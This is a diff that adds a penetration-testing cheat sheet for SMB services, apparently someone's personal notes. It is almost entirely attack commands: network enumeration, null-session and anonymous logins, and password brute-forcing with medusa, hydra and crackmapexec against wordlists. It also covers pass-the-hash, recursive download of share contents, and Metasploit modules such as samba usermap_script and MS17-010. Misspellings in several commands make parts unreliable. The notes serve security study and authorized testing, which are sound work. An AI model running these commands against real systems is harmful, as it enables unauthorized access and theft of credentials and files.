@@ -1,0 +1,116 @@
+smb 139,445
+
+Enumeraiton : - 
+nmap -p 139,445 --open -oG smb.txt x.x.x.x/24
+nbtscan -r x.x.x.x
+
+quick vulnerability scan : - 
+nmap --script=smb-vuln* --script-args=unsafe=1 -T5 x.x.x.x
+
+nmap --script=smb-enum* --script-args=unsafe=1 -T5 x.x.x.x
+
+full enum and vulnerability scan :- 
+
+nmap --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stots,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7497,smb-vuln-ms06-0025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsare=1 -T5 x.x.x.x
+nmap --script 'note brute and  not dos and smb-*' -vv -d x.x.x.x
+
+enum4linux -a x.x.x.x
+enum4linux x.x.x.x
+
+nmblookup -A x.x.x.x
+nbtscan -r x.x.x.x
+
+rpcclient -U "" x.x.x.x  # connect as blank user /nobody
+smbmap -u "" -p "" -d Migroup -H x.x.x.x
+
+#upload files : - 
+smbclient //x.x.x.x
+
+enum4linux -a -u " -P " x.x.x.x
+
+metasploit :- 
+use auxilary/scanner/smb/smb_enumusers
+
+# version check :- 
+use auxilary/scanner/smb/smb_version
+
+windows null session :- 
+net use \\x.x.x.x\IP$ ""/u:""
+
+use acccheck gor getting user pass using smb:- 
+acccheck -v -t x.x.x.x
+acccheck -t x.x.x.x
+
+once you got user creds use will use the creds to see the shares using smbmap 
+
+smbmap -u admin -p password -d domain.local -H x.x.x.x
+smbmap -L -u user -p password -d workgroup -H x.x.x.x
+
+if you have only read privilege read the shares :- 
+smbmap -r -u user -p pass -d wordgroup -H x.x.x.x
+
+brute force login :- 
+medusa -h x.x.x.x -u admin -P /usr/share/seclists/Passwords/common-credentials/10k-most-common.txt -M smbnt
+nmap -p445 --script smb-brute --script-args userdb=admin,passdb=/usr/share/seclists/Passwords/common-credentials/10-million-password-list-top-1000000.txt x.x.x.x -vvvv
+hydra -l admin -P /usr/share/wordlists/rockyou.txt x.x.x.x smb
+cme smb x.x.x.x -u users.txt -p pass.txt --continue-on-success
+
+hashes brute force :- 
+cme smb x.x.x.x -u users.txt -H "ntlm hash" --continue-on-success
+
+enumerate users if the ipc share is readable:- 
+cme smb x.x.x.x -u admin -p password --rid-brute
+
+null anonymous login : - 
+# on same congiguraion omitting '-N' will grant access.
+
+smbclient -U '' -L \\\\x.x.x.x
+smbclient -U '' -N -L \\\\x.x.x.x
+
+smbclient -U '%' -N -L \\\\x.x.x.x
+smbclient -U '%' -N\\\\x.x.x.x\\shares
+
+# enter a random  username with an password and try for anonymous login :- 
+crackmapexec smb x.x.x.x -u 'anonymous' -p ''
+crackmapexec smb x.x.x.x -u '' -p ''
+crackmapexec smb x.x.x.x -u '' -p '' --shares
+
+Download files :-
+smbclient '\\x.x.x.x\shares' -N -c'prompt oFF;recurse on;mget *'
+
+file operaions : - 
+get # download a file 
+prompt off # y/n promp disable 
+recurse on 
+
+finaly : - 
+
+smbclient x.x.x.x
+recurse on 
+prompt off
+mget *
+
+exploits :- 
+nmap --script smb-vuln-ms17-010 -p 445 x.x.x.x
+use auxilary/admin/smb/samba_symlink_traversal
+
+multi exploit:- 
+msfconsole;use exploit/multi/samba/usermap_script;set lhost x.x.x.x;set rhost x.x.x.x;run
+
+vulnerable versions :-
+windows 7,8,801 and windows server 2003/2008/2012(R2)2016
+nmap -p 445 x.x.x.x --script=smb-vuln-ms17-010
+
+windows nt,2000 and xp(most smb1) # vulnerable version
+null sessions can be created by defaults.
+
+windows 2003,and xp sp2 onwords # not vulnerable:null sessions can't be created defalut
+most samba(unix) servers
+
+list of smb versions and carresponding windows versions:- 
+smb1 - windows 2000,xp and windows 2003
+smb2 - windows vista sp1 and windows 2008
+smb2.1 - windows 7 and windows 2008 R2
+smb3 - windows 8 and windows 2012
+
+
